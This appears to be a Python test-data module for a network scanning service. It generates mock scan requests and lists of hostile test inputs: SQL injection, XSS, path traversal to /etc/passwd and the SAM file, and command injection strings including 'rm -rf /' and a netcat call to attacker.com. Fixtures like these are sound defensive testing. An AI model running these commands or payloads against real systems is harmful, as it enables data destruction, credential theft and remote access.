"""
Test data generators and utilities for integration tests.

Provides functions to generate realistic test data for various
testing scenarios.
"""

import random
import string
from typing import List, Dict, Any
from datetime import datetime, timedelta
from faker import Faker

fake = Faker()


def generate_random_ip() -> str:
    """Generate a random IP address."""
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def generate_random_port() -> int:
    """Generate a random port number."""
    return random.randint(1, 65535)


def generate_random_mac() -> str:
    """Generate a random MAC address."""
    return ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])


def generate_api_key(length: int = 32) -> str:
    """Generate a random API key."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def generate_jwt_token() -> str:
    """Generate a mock JWT token."""
    header = ''.join(random.choices(string.ascii_letters + string.digits, k=36))
    payload = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
    signature = ''.join(random.choices(string.ascii_letters + string.digits, k=43))
    return f"{header}.{payload}.{signature}"


def generate_scan_request(tool: str = "nmap", target: str = None) -> Dict[str, Any]:
    """
    Generate a mock scan request.

    Args:
        tool: Tool name (nmap, gobuster, etc.)
        target: Target to scan (random if None)

    Returns:
        Scan request dictionary
    """
    if target is None:
        target = generate_random_ip()

    request = {
        "tool": tool,
        "target": target,
        "timestamp": datetime.now().isoformat(),
        "request_id": fake.uuid4()
    }

    if tool == "nmap":
        request["options"] = {
            "scan_type": random.choice(["-sT", "-sS", "-sV", "-O"]),
            "ports": f"1-{random.randint(1000, 65535)}",
            "timing": random.choice(["-T2", "-T3", "-T4"])
        }
    elif tool == "gobuster":
        request["options"] = {
            "mode": random.choice(["dir", "dns", "vhost"]),
            "wordlist": "/usr/share/wordlists/dirb/common.txt",
            "threads": random.randint(5, 50)
        }

    return request


def generate_scan_history(count: int = 10) -> List[Dict[str, Any]]:
    """
    Generate mock scan history.

    Args:
        count: Number of history entries to generate

    Returns:
        List of scan history entries
    """
    history = []
    tools = ["nmap", "gobuster", "nikto", "sqlmap"]
    statuses = ["completed", "failed", "timeout", "cancelled"]

    for i in range(count):
        entry = {
            "id": i + 1,
            "tool": random.choice(tools),
            "target": generate_random_ip(),
            "status": random.choice(statuses),
            "timestamp": (datetime.now() - timedelta(hours=random.randint(1, 168))).isoformat(),
            "duration": random.uniform(1.0, 300.0),
            "user": fake.user_name()
        }

        if entry["status"] == "completed":
            entry["ports_found"] = random.randint(0, 20)
            entry["vulnerabilities"] = random.randint(0, 5)

        history.append(entry)

    return sorted(history, key=lambda x: x["timestamp"], reverse=True)


def generate_concurrent_requests(count: int = 10) -> List[Dict[str, Any]]:
    """
    Generate multiple concurrent scan requests.

    Args:
        count: Number of requests to generate

    Returns:
        List of scan requests
    """
    tools = ["nmap", "gobuster"]
    return [
        generate_scan_request(
            tool=random.choice(tools),
            target=generate_random_ip()
        )
        for _ in range(count)
    ]


def generate_stress_test_data(num_targets: int = 100) -> List[str]:
    """
    Generate data for stress testing.

    Args:
        num_targets: Number of targets to generate

    Returns:
        List of target addresses
    """
    return [generate_random_ip() for _ in range(num_targets)]


def generate_malformed_json() -> List[str]:
    """Generate various malformed JSON strings for testing."""
    return [
        "{incomplete",
        '{"key": }',
        '{"key": "value"',
        '{"key": "value",}',
        "{",
        "}",
        '{"nested": {"incomplete": }',
        '{"array": [1, 2, 3,]}',
        '{"string": "unterminated',
        "not json at all",
        "",
        "null",
    ]


def generate_sql_injection_attempts() -> List[str]:
    """Generate SQL injection test strings."""
    return [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "admin'--",
        "' OR '1'='1' /*",
        "1' UNION SELECT NULL--",
        "' WAITFOR DELAY '00:00:05'--",
        "1' AND 1=1--",
        "1' AND 1=2--",
    ]


def generate_xss_attempts() -> List[str]:
    """Generate XSS attack test strings."""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(`XSS`)'>",
        "<body onload=alert('XSS')>",
    ]


def generate_path_traversal_attempts() -> List[str]:
    """Generate path traversal test strings."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..;/..;/..;/etc/passwd",
        "../../../../../../../../../../etc/passwd",
    ]


def generate_command_injection_attempts() -> List[str]:
    """Generate command injection test strings."""
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "|| echo vulnerable",
        "`whoami`",
        "$(whoami)",
        "; rm -rf /",
        "& nc attacker.com 4444",
    ]


def generate_buffer_overflow_attempts() -> List[str]:
    """Generate buffer overflow test strings."""
    return [
        "A" * 1000,
        "A" * 10000,
        "A" * 100000,
        "\x00" * 1000,
        "%s" * 1000,
        "%x" * 1000,
    ]


def generate_unicode_edge_cases() -> List[str]:
    """Generate Unicode edge case test strings."""
    return [
        "\u0000",  # Null
        "\ufeff",  # BOM
        "测试",  # Chinese
        "тест",  # Cyrillic
        "🔒🔑",  # Emojis
        "\u202e",  # Right-to-left override
        "A\u0301",  # Combining characters
    ]


# Pre-generated test datasets
TEST_TARGETS = {
    "valid": [
        "scanme.nmap.org",
        "127.0.0.1",
        "192.168.1.1",
        "10.0.0.1",
        "example.com",
        "localhost",
    ],
    "invalid": [
        "999.999.999.999",
        "256.1.1.1",
        "not-a-valid-ip",
        "",
        " ",
        "null",
    ],
    "malicious": generate_command_injection_attempts()
}


TEST_PORTS = {
    "common": [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080],
    "registered": list(range(1024, 49151, 1000)),
    "dynamic": list(range(49152, 65535, 1000)),
}


TEST_CREDENTIALS = {
    "valid": [
        {"username": "admin", "password": "password123"},
        {"username": "test", "password": "test123"},
        {"api_key": "sk_test_1234567890abcdef"},
    ],
    "invalid": [
        {"username": "", "password": ""},
        {"username": "admin", "password": ""},
        {"username": "", "password": "password"},
        {},
    ],
    "malicious": [
        {"username": "admin'--", "password": "anything"},
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "<script>alert('xss')</script>", "password": "test"},
    ]
}
